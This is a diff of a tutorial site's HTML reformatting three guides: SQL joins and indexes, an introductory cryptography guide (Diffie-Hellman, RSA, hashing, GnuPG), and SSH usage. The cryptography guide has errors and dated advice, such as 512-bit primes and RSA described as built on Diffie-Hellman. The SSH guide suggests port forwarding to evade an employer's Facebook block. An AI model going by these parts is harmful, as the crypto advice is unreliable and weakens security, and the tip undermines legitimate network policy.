+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_user_name    <span class="kw">ON</span> users    (user_name);
+<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_project_name <span class="kw">ON</span> projects (project_name);</code></pre>
 <p>It goes without saying that we need to index the foreign key columns:</p>
-<p>{% highlight sql %} CREATE INDEX index_on_user_id ON contributorships (user_id); CREATE INDEX index_on_project_id ON contributorships (project_id); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_user_id    <span class="kw">ON</span> contributorships (user_id);
+<span class="kw">CREATE</span> <span class="kw">INDEX</span> index_on_project_id <span class="kw">ON</span> contributorships (project_id);</code></pre>
 <p>We also need to make sure that duplicate contributorships cannot exist.</p>
 <p>We achieve this by creating a unique index on the combination of <code>user_id</code> and <code>project_id</code>:</p>
-<p>{% highlight sql %} CREATE UNIQUE INDEX unique_index_on_user_id_and_project_id ON contributorships (user_id,project_id); {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">UNIQUE</span> <span class="kw">INDEX</span> unique_index_on_user_id_and_project_id <span class="kw">ON</span> contributorships (user_id,project_id);</code></pre>
 <p>First, let’s list all contributorships in human readable format:</p>
-<p>{% highlight sql %} SELECT user_name || &quot; contributes to &quot; || project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name, project_name; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  user_name || <span class="ot">&quot; contributes to &quot;</span> || project_name
+<span class="kw">FROM</span>
+  contributorships,
+  users,
+  projects
+<span class="kw">WHERE</span>
+  users.id = contributorships.user_id
+  <span class="kw">AND</span>
+  projects.id = contributorships.project_id
+<span class="kw">ORDER</span> <span class="kw">BY</span>
+  user_name, project_name;</code></pre>
 <p>The output you should get is:</p>
 <pre><code>alex-morega contributes to mitsuhiko/flask
 alex-morega contributes to rosedu/WebDev
@@ -1408,24 +1730,63 @@ igstan contributes to gvoicu/miniflow
 igstan contributes to rosedu/WebDev
 torvalds contributes to torvalds/linux</code></pre>
 <p>Now let’s determine all projects for a given user, as well as the list of all people who contribute to a given project.</p>
-<p>{% highlight sql %} SELECT project_name FROM contributorships, users, projects WHERE users.user_name = ‘gvoicu’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY project_name; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  project_name
+<span class="kw">FROM</span>
+  contributorships,
+  users,
+  projects
+<span class="kw">WHERE</span>
+  users.user_name = <span class="st">&#39;gvoicu&#39;</span>
+  <span class="kw">AND</span>
+  users.id = contributorships.user_id
+  <span class="kw">AND</span>
+  projects.id = contributorships.project_id
+<span class="kw">ORDER</span> <span class="kw">BY</span>
+  project_name;</code></pre>
 <p>The output you should get is:</p>
 <pre><code>gvoicu/miniflow
 rails/rails
 rosedu/WebDev
 sinatra/sinatra</code></pre>
 <p>To list a given project’s contributors:</p>
-<p>{% highlight sql %} SELECT user_name FROM contributorships, users, projects WHERE projects.project_name = ‘rosedu/WebDev’ AND users.id = contributorships.user_id AND projects.id = contributorships.project_id ORDER BY user_name; {% endhighlight %}</p>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">SELECT</span>
+  user_name
+<span class="kw">FROM</span>
+  contributorships,
+  users,
+  projects
+<span class="kw">WHERE</span>
+  projects.project_name = <span class="st">&#39;rosedu/WebDev&#39;</span>
+  <span class="kw">AND</span>
+  users.id = contributorships.user_id
+  <span class="kw">AND</span>
+  projects.id = contributorships.project_id
+<span class="kw">ORDER</span> <span class="kw">BY</span>
+  user_name;</code></pre>
 <p>The output you should get is:</p>
 <pre><code>alex-morega
 dserban
 gvoicu
 igstan</code></pre>
 <p>Finally, let’s create a view which will make it easier for us to go back and forth between users and projects:</p>
-<p>{% highlight sql %} CREATE VIEW augmented_contributorships AS SELECT user_name, project_name FROM contributorships, users, projects WHERE users.id = contributorships.user_id AND projects.id = contributorships.project_id; {% endhighlight %}</p>
-<h3 id="closing-words">Closing words</h3>
+<pre class="sourceCode sql"><code class="sourceCode sql"><span class="kw">CREATE</span> <span class="kw">VIEW</span> augmented_contributorships <span class="kw">AS</span>
+<span class="kw">SELECT</span>
+  user_name, project_name
+<span class="kw">FROM</span>
+  contributorships,
+  users,
+  projects
+<span class="kw">WHERE</span>
+  users.id = contributorships.user_id
+  <span class="kw">AND</span>
+  projects.id = contributorships.project_id;</code></pre>
+</section>
+<section id="closing-words" class="level3">
+<h3>Closing words</h3>
 <p>This short overview of SQL ends here.</p>
 <p>If you want to learn more SQL tips and tricks, I highly recommend <a href="http://sql.learncodethehardway.org/book/">Learn SQL The Hard Way</a></p>
+</section>
 
     </div>
   </div>
@@ -1464,31 +1825,45 @@ igstan</code></pre>
 
       <p>This guide is designed to explain why you need to hide information and how can you do this when you do not trust the channel through which messages are conveyed. We will discuss about cryptographic system, encryption, decryption, one-way function, asymmetric keys and more. You may think of cryptography as the thing that keeps you untouchable inside of a soap bubble travelling by air around the world.</p>
 <p>Do you think it is safer by plane?</p>
-<h3 id="terminology">Terminology</h3>
-<p><em>plaintext</em> or <em>cleartext</em> : intelligible message that sender wants to transmit to a receiver</p>
-<p><em>ciphertext</em> : unintelligible message resulted from <em>plaintext</em> encryption using a <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a></p>
-<p><em>encryption</em> : the process of converting a <em>plaintext</em> into a <em>ciphertext</em></p>
-<p><em>decryption</em> : the process of converting a <em>ciphertext</em> into a <em>plaintext</em> (reverse of <em>encryption</em>)</p>
-<h3 id="conventional-cryptography">Conventional cryptography</h3>
+<section id="terminology" class="level3">
+<h3>Terminology</h3>
+<ul>
+<li><p><em>plaintext</em> or <em>cleartext</em> : intelligible message that sender wants to transmit to a receiver</p></li>
+<li><p><em>ciphertext</em> : unintelligible message resulted from <em>plaintext</em> encryption using a <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a></p></li>
+<li><p><em>encryption</em> : the process of converting a <em>plaintext</em> into a <em>ciphertext</em></p></li>
+<li><p><em>decryption</em> : the process of converting a <em>ciphertext</em> into a <em>plaintext</em> (reverse of <em>encryption</em>)</p></li>
+</ul>
+</section>
+<section id="conventional-cryptography" class="level3">
+<h3>Conventional cryptography</h3>
 <p>It is also called <em>symmetric-key</em> or <em>shared-key</em> encryption. The same key is used to encrypt and decrypt a message. Consider this example as a conventional cryptography:</p>
-<p><em>You and your roommate, both use the same key to lock/unlock the door of your house. Thus, you share the same key to secure the room. It is true that your roommate could have a copy of your key so he can join the room when you are at work or vice-versa.</em></p>
+<blockquote>
+<p>You and your roommate, both use the same key to lock/unlock the door of your house. Thus, you share the same key to secure the room. It is true that your roommate could have a copy of your key so he can join the room when you are at work or vice-versa.</p>
+</blockquote>
 <p>Example of conventional <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> that use <em>symmetric-key</em>: <a href="https://en.wikipedia.org/wiki/Data_Encryption_Standard">Data Encryption Standard (DES)</a>, <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard">Advanced Encryption Standard (AES)</a></p>
 <p>Advantages: Fast.</p>
 <p>Disadvantages: Not safe! The sender and receiver must agree upon a secret key and prevent others from getting access to it. There is also a big problem if they are not in the same physical location because of key distribution. How could you give your home key to your roommate, which is in America while you are in China?</p>
 <p>Practical advice: Symmetric key should be changed with any message, so that only one message can be leaked in case of disaster (crypt-analysed, stole, etc).</p>
-<h3 id="key-distribution">Key distribution</h3>
+</section>
+<section id="key-distribution" class="level3">
+<h3>Key distribution</h3>
 <p>In the previous paragraph we were talking about <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystems</a> using <em>symmetric-keys</em> and the lack of an efficient method to securely share your key with your roommate. Key distribution comes to help solving this shortcoming. Next we are going to explain how key exchange becomes possible over an untrusted communication channel.</p>
-<h4 id="diffie-hellman-key-exchange">Diffie-Hellman key exchange</h4>
+<section id="diffie-hellman-key-exchange" class="level4">
+<h4>Diffie-Hellman key exchange</h4>
 <p>This key exchange is based on an algorithm that mathematically cannot easily compute <a href="https://en.wikipedia.org/wiki/Discrete_logarithm">discrete logarithms</a> of large numbers in a reasonable amount of time. We will offer an overview of the algorithm using colours before we run straightforward with numbers and abstract formula.</p>
 <p><img style="float:right"
 src='/images/from-0-to-cryptography-diffie-hellman-key-exchange.png'
 alt="Diffie-Hellman Key Exchange" width="300" height="450"/></p>
-<p><strong>Step 1</strong>: Alice and Bob come to an agreement for a common colour.</p>
-<p><strong>Step 2</strong>: Alice choose her secret colour that will not tell to Bob. Bob will do the same thing.</p>
-<p><strong>Step 3</strong>: Alice will mix the common colour with the secret one and the result is a mixture. Bob will also mix his secret colour with the common one and will obtain a different mixture from Alice’s one.</p>
-<p><strong>Step 4</strong>: Alice and Bob exchange the mixtures. This is the most critical step for communication because a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> could get access to those two mixtures. There is also a problem if the <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> has both mixtures. Colour decomposition is irreversible. So the only chance to find two’s secret colour is mixing all possible colours with the common colour from step one. Also, remember that a secret colour can be also a mixture of many other colours.</p>
+<ol type="1">
+<li><p><strong>Step 1</strong>: Alice and Bob come to an agreement for a common colour.</p></li>
+<li><p><strong>Step 2</strong>: Alice choose her secret colour that will not tell to Bob. Bob will do the same thing.</p></li>
+<li><p><strong>Step 3</strong>: Alice will mix the common colour with the secret one and the result is a mixture. Bob will also mix his secret colour with the common one and will obtain a different mixture from Alice’s one.</p></li>
+<li><p><strong>Step 4</strong>: Alice and Bob exchange the mixtures. This is the most critical step for communication because a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> could get access to those two mixtures. There is also a problem if the <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> has both mixtures. Colour decomposition is irreversible. So the only chance to find two’s secret colour is mixing all possible colours with the common colour from step one. Also, remember that a secret colour can be also a mixture of many other colours.</p></li>
+</ol>
 <p><strong>Update:</strong> Diffie-Hellman does not protect you from a <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">man-in-the-middle</a> attack. To see why, imagine an attacker receiving all messages from Alice and replaying them back to Bob.</p>
-<p><strong>Step 5</strong>: Alice will add again her secret colour to the mixture that Bob sent to her. Bob will follow the same steps.</p>
+<ol start="5" type="1">
+<li><strong>Step 5</strong>: Alice will add again her secret colour to the mixture that Bob sent to her. Bob will follow the same steps.</li>
+</ol>
 <p>Finally Alice and Bob will obtain <strong>a common</strong> secret colour. Now, Alice and Bob can safely exchange the symmetric-key we were talking in a previous chapter, because they can encrypt and decrypt any message (sent through a communication channel) using the above <strong>secret colour</strong>.</p>
 <p>And here comes math. It is always about math when we do not have enough colours.</p>
 <p><strong>Step 1</strong>: Alice and Bob come to an agreement for two large numbers: one <a href="https://en.wikipedia.org/wiki/Prime_number">prime</a> <code>p</code> (recommended at least 512 bits) and a base <code>g</code> (a <a href="https://en.wikipedia.org/wiki/Primitive_root_modulo_n">primitive root</a> of <code>p</code>).</p>
@@ -1500,7 +1875,7 @@ b &lt; p-1</code></pre>
 <p><strong>Step 3</strong>: Alice computes public value <code>x = g^a mod p</code>. Bob computes public value <code>y = g^b mod p</code>, where <code>mod</code> is <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo operator</a>.</p>
 <p><strong>Step 4</strong>: Alice and Bob exchange <code>x</code> and <code>y</code>.</p>
 <p><strong>Step 5</strong>: Alice computes her secret key <code>k_a = y^a mod p</code>. Bob computes his secret key <code>k_b = x^b mod p</code>. Mathematically it can be proved that <code>k_a = k_b</code>. Alice and Bob now have a common secret key used for encryption and decryption of any plaintext they exchange to safely communicate.</p>
-<p>Example:</p>
+<p><em>Example:</em></p>
 <pre><code>p = 23, g = 5
 a = 6
 b = 15
@@ -1529,7 +1904,10 @@ k_b = 8^15 mod 23 = 35184372088832 mod 23 = 2</code></pre>
 =
 0100100001100101011011000110110001101111 = M (original message)</code></pre>
 <p>Why it is this algorithm important? Because protocols like: <a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer">SSL</a>, <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TSL</a>, <a href="https://en.wikipedia.org/wiki/Secure_Shell">SSH</a>, <a href="https://en.wikipedia.org/wiki/Public-key_infrastructure">PKI</a> or <a href="https://en.wikipedia.org/wiki/IPsec">IPSec</a>, all use Diffie-Hellman.</p>
-<h3 id="public-key-cryptography">Public key cryptography</h3>
+</section>
+</section>
+<section id="public-key-cryptography" class="level3">
+<h3>Public key cryptography</h3>
 <p>Safe key distribution is resolved by <em>public-key</em> because it does not require a secure initial key exchange between you and your roommate. This <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> is an <em>asymmetric-key</em> encryption – in contrast to <em>symmetric-key</em> – that uses a pair of keys (two separate keys): a <em>public key</em> for encoding and a <em>private key</em>, also called <em>secret key</em>, for decoding. The <em>public-key</em> should not compromise the <em>private-key</em> even though both are linked.</p>
 <pre><code>public-key != private-key</code></pre>
 <p>We can compare the asymmetric-key <a href="https://en.wikipedia.org/wiki/Cryptosystem">cryptosystem</a> with an e-mail account. Your e-mail address is accessible to wide public (anyone can send you an e-mail at your@email.com, for example) but you are the only one who has the password to log in (that means only you can read the content of the e-mails). The public-key is your e-mail address and the private-key is the password linked with your e-mail address.</p>
@@ -1542,7 +1920,9 @@ k_b = 8^15 mod 23 = 35184372088832 mod 23 = 2</code></pre>
 <p>Advantages: Convenience and security is increased.</p>
 <p>Disadvantages: Slow encryption speed. All public-private keys are susceptible to <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force attack</a> (this can be avoided by choosing large key size). You can not verify partner’s identity (vulnerable to impersonation).</p>
 <p><strong>Usage</strong>: Since large key size produces too large output of encrypted message, encrypting and transmitting messages take longer. For practise purpose, public keys are preferred for short messages encryption, such as transmitting private keys or digital certificates, rather than encrypting long messages. The inconvenient is that shorter key length offers lower security, but you win when it comes to encrypted messages length or transfer time. Because of that, keys should be frequently replaced with new ones.</p>
-<h3 id="rsa">RSA</h3>
+</section>
+<section id="rsa" class="level3">
+<h3>RSA</h3>
 <p>RSA named for Rivest, Shamir and Adleman, is the next implementation of public key cryptosystem that use Diffie-Hellman method described in a previous paragraph. This algorithm is based on the fact the large integers are difficult to factorize.</p>
 <p>I will explain RSA algorithm step by step not before I assume you love math :)</p>
 <p>First of all you should have knowledge about <a href="https://en.wikipedia.org/wiki/Modulo_operation">mod (modulo operation)</a> and <a href="https://en.wikipedia.org/wiki/Coprime_integers">coprime integers</a>.</p>
@@ -1586,7 +1966,9 @@ x^((p-1)*(q-1)+1) mod p*q = x</code></pre>
 <pre><code>ciphertext = plaintext^E mod p*q
 plaintext = ciphertext^D mod p*q</code></pre>
 <p>Attacks against RSA is based on the weakness of exponent <code>E</code> and small <code>ciphertext</code> if the result <code>ciphertext^E &lt; p*q</code>. It is recommended to use large key size of encryption.</p>
-<h3 id="hash-functions">Hash functions</h3>
+</section>
+<section id="hash-functions" class="level3">
+<h3>Hash functions</h3>
 <p>So far we are glad that we can protect the content of messages we exchange over an untrusted connection, but we never addressed the problem of content integrity. How can we be sure that the content of the message (even encrypted) suffers unauthorized alteration?</p>
 <p>A hash function or as we call ‘a one-way function’ or ‘irreversible function’ or ‘non-bijective function’ is a function that takes as input a message of variable length and produces a fixed-length output.</p>
 <p>For example, calculate the <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> of the following string using different hash functions:</p>
@@ -1616,7 +1998,9 @@ tibi@tbarbu-pc:~/hash_collision$ md5sum message1 message2
 1e934ac2f323a9158b43922500ca7040  message1
 1e934ac2f323a9158b43922500ca7040  message2</code></pre>
 <p>As you can see two files with different content – only 6 bytes in this case had to be changed – have the same MD5 checksum. We call this hash collision.</p>
-<h3 id="digital-certificate">Digital certificate</h3>
+</section>
+<section id="digital-certificate" class="level3">
+<h3>Digital certificate</h3>
 <p>We have been talking for a long time about encryption and decryption but what if our cryptosystem is secure enough though we can not be sure about the real identity of the person he/she pretends to be? Well, Diffie-Hellman key exchange did not address the shortcoming of being sure of the real identity. Information security is a fundamental objective of cryptography and consists no only in confidentiality and data integrity, but also in non-repudiation or authentication.</p>
 <p>Before talking about certificate, let’s see how does digital signature work. At the end we will see there is a big difference as regarding authentication and non-repudiation.</p>
 <p>As we discussed about <em>asymmetric-key</em> and <em>hash functions</em>, we will explain why are those important for digital signature. An analog to digital signature is the handwriting signature. Though the latter is easy to counterfeit, digital signature comes to provide a lot more security (almost impossible to counterfeit). Let’s see how it works:</p>
@@ -1634,7 +2018,9 @@ tibi@tbarbu-pc:~/hash_collision$ md5sum message1 message2
 width="685" height="159"/></p>
 <p><img style="float:center" src='/images/decoding.png' alt="Verifying digital
 signature" width="685" height="239"/></p>
-<h3 id="gnupg-gpg">GnuPG (GPG)</h3>
+</section>
+<section id="gnupg-gpg" class="level3">
+<h3>GnuPG (GPG)</h3>
 <p>Gnu Privacy Guard is an alternative option to the <a href="https://en.wikipedia.org/wiki/Pretty_Good_Privacy">PGP</a>. What is more exactly GPG, why and how to use it? It is a hybrid encryption software that utilizes public key encryption algorithm. Despite PGP, which makes use of <a href="https://en.wikipedia.org/wiki/International_Data_Encryption_Algorithm">IDEA</a> (a patented encryption algorithm), GnuPG utilize other algorithms like asymmetric-key, hash functions, symmetric-key or digital signatures.</p>
 <p>Let’s see GnuPG in action.</p>
 <p>Install GnuPG:</p>
@@ -1869,6 +2255,7 @@ roT/qVfAyNwDijRZb/INy8UEBd9am+8LyCjC1pJgKv5HqBbvyDNYTcB/EBa2YjUU
 gpg: Signature made Mon 17 Sep 2012 12:01:35 PM EEST using RSA key ID ECB916DC
 gpg: Good signature from &quot;Tiberiu (This is my GPG key) &lt;email@home.com&gt;&quot;</code></pre>
 <p><a href="http://www.youtube.com/watch?v=gBzJGckMYO4">That’s all folks</a>. Thank you and I hope you find this guide useful.</p>
+</section>
 
     </div>
   </div>
@@ -1908,7 +2295,8 @@ gpg: Good signature from &quot;Tiberiu (This is my GPG key) &lt;email@home.com&g
       <p>This is an article aiming to familiarize the reader with the features and benefits of using <a href="https://en.wikipedia.org/wiki/Secure_Shell" title="SSH">Secure Shell (SSH)</a>, particularly with the <a href="http://www.openssh.org/" title="OpenSSH">OpenSSH</a> implementation. SSH is an application level protocol used for secure data communication, whether that means remote shell access, command execution, file transfer and some other aspects described in this article. It was meant to be a replacement for existing insecure remote shell protocols such as <code>telnet</code>, <code>rsh</code> and <code>rexec</code> which send information in plaintext, including usernames and passwords.</p>
 <p>SSH uses <a href="https://en.wikipedia.org/wiki/Public-key_cryptography" title="public-key cryptography">public-key cryptography</a> for authentication purposes. In short, this works like this: each user has a pair of keys, one public and one private. They are mathematically related, but it is computationally infeasible to derive one from the other. The public key is … well, public! Anyone can get that, and they would use it to encrypt messages. The private key, however, is (or should be) accessible only by the user, and used to decrypt incoming messages.</p>
 <p>The two parties of a SSH communication are the server and the client. The server usually runs on port 22, but that is not a requirement, and the client will use a random available port on the client machine.</p>
-<h3 id="setting-up-ssh">Setting up SSH</h3>
+<section id="setting-up-ssh" class="level3">
+<h3>Setting up SSH</h3>
 <p>The simplest way to install a SSH client is with your package manager. On Debian-based distros, it would be something like:</p>
 <pre><code>$ sudo apt-get install openssh-client</code></pre>
 <p>After that finishes, you can generate a pair of cryptographic keys using the command <code>ssh-keygen</code>:</p>
@@ -1947,7 +2335,9 @@ $ service ssh status</code></pre>
 <p>You can also run just one line of commands, such as:</p>
 <pre><code>$ ssh my_user@my.server.com &#39;ls -la; apt-get moo&#39;</code></pre>
 <p>So this would be the basic usage of SSH. You can do a lot just with what is written up to this point, and you might be tempted to close the article and just get back to what you wanted to do in the first place. But seriously, you would be missing a lot of the cool stuff SSH can do. Just <a href="https://xkcd.com/365/" title="XKCD">bear with me for a moment</a> and you will end up being more productive with SSH.</p>
-<h3 id="copying-files-remotely">Copying files remotely</h3>
+</section>
+<section id="copying-files-remotely" class="level3">
+<h3>Copying files remotely</h3>
 <p>You can use <code>cat</code> and pipes to copy a file remotely:</p>
 <pre><code>$ cat test.txt | ssh -e none user@host &#39;cat &gt; remote_test.txt&#39;</code></pre>
 <p>The <code>-e</code> option disables escape characters so that you can send any bytes that your file may contain. The rest is a trick: the output of the remote <code>cat</code> is redirected to a file, but the input comes from the output of the first half of the pipe, which is the contents of the file you want to transfer. Neat, right?</p>
@@ -1956,20 +2346,24 @@ $ service ssh status</code></pre>
 <p>Notice that colon after host because it is critical. If you did not want to rename the file you would have just used <code>user@host:</code>. The colon tells scp the destination is a remote location. Otherwise, you would just copy <code>test.txt</code> to a file named <code>user@host</code>.</p>
 <p>Also, the path after the colon is relative to the home directory of the remote user.</p>
 <p>There is also the <code>sftp</code> utility which provides a FTP-like interface.</p>
-<h3 id="passwordless-authentication">Passwordless authentication</h3>
+</section>
+<section id="passwordless-authentication" class="level3">
+<h3>Passwordless authentication</h3>
 <p>So, up until now you have connected via SSH by providing your password, maybe even a passphrase. You can probably see by now that this is troublesome and can be a major drawback if you would like to make a script using SSH. How about we ditch that remote password?</p>
 <p>To do this, you would basically need to append the contents of your public key to a file located at <code>~/.ssh/authorized_keys</code> on the server.</p>
 <p>Luckily for you, most SSH packages provide an utility called <code>ssh-copy-id</code> that does just that. So you would just run:</p>
 <pre><code>$ ssh-copy-id user@host</code></pre>
 <p>Next time you will try to log on to that account, you will not be prompted for your password.</p>
 <p>As an exercise, knowing what you have read thus far, figure out two more ways of achieving the same result, just in case you do not have <code>ssh-copy-id</code>.</p>
-<h3 id="config-file">Config file</h3>
+</section>
+<section id="config-file" class="level3">
+<h3>Config file</h3>
 <p>If you are going to use SSH with several servers, with various settings and different key pairs you will soon have to enter something like this:</p>
 <pre><code>$ ssh -i ~/.ssh/private_key_file10 -l user -p 2222 -o &quot;ForwardX11 yes&quot; the.mother.of.all.servers.com</code></pre>
 <p>Now that is an extremely long and ugly line with no particular purpose but to illustrate the complexity of ssh commands. Some who have read the manual page know that X forwading can be achieved by passing <code>-X</code>.</p>
 <p>Anyway, an initial approach to bypassing this issue is by using aliases of bash functions. But those are limited in functionality and basically you are just placing that ugly command somewhere else. Not cool, not cool.</p>
 <p>You can put settings on your local computer in <code>~/.ssh/config</code>. The full list of options, and their possible values, is available via <code>man ssh_config</code>.</p>
-<p>Here is a modified version of my config file, for security reasons:</p>
+<p>Here is a modified version (for security reasons) of my config file:</p>
 <pre><code>Host compilers
 	User ubuntu
 	Hostname ec2-50-17-91-154.compute-1.amazonaws.com
@@ -1996,16 +2390,30 @@ Host github
 	IdentityFile ~/.ssh/github</code></pre>
 <p>Now you could put all those options for that long command above in a organized manner, and it will work with all SSH-related utilities, even <code>scp</code>, with the options you specified:</p>
 <pre><code>$ scp something mother:</code></pre>
-<h3 id="local-port-forwarding">Local port forwarding</h3>
+</section>
+<section id="local-port-forwarding" class="level3">
+<h3>Local port forwarding</h3>
 <p>Let’s assume that your employer has banned Facebook, so that people might actually do something useful.</p>
 <p>Let’s also assume that you have a SSH server that you can reach and has no filtering for Facebook.</p>
 <p>You could do something like this</p>
 <pre><code>$ ssh your.server.com -L 80:facebook.com:80</code></pre>
-<p>This achieves the following effect: any connection to port 80 on your machine is passed, via your remote machine, to port 80 on facebook.com, which is the standard port for HTTP. After that, set an entry matching facebook.com to 127.0.0.1 in <code>/etc/hosts</code> and procrastinate.</p>
+<p>This achieves the following effect: any connection to port 80 on your machine is passed, via your remote machine, to port 80 on facebook.com, which is the standard port for HTTP.</p>
+<p>After that, set an entry matching facebook.com to 127.0.0.1 in <code>/etc/hosts</code> and procrastinate.</p>
 <p>But first, take a moment to come up with a section in your config file that does this forwarding. (Hint: <code>LocalForward</code>)</p>
-<h3 id="conclusions">Conclusions</h3>
+</section>
+<section id="conclusions" class="level3">
+<h3>Conclusions</h3>
 <p>So now you have a set of things you could do with SSH that can make you be more productive (or not if you just read the last part). I hope you found the article useful.</p>
-<p>If you want to know about more things you could do with SSH here is a list of terms you might want to search the web for: * SSH tunnels * SSH remote port forwarding * Set up a SOCKS proxy for Firefox with SSH * sshfs * SSH master sessions * ssh-agent and ssh-reagent</p>
+<p>If you want to know about more things you could do with SSH here is a list of terms you might want to search the web for:</p>
+<ul>
+<li>SSH tunnels</li>
+<li>SSH remote port forwarding</li>
+<li>Set up a SOCKS proxy for Firefox with SSH</li>
+<li>sshfs</li>
+<li>SSH master sessions</li>
+<li>ssh-agent and ssh-reagent</li>
+</ul>
+</section>
 
     </div>
   </div>
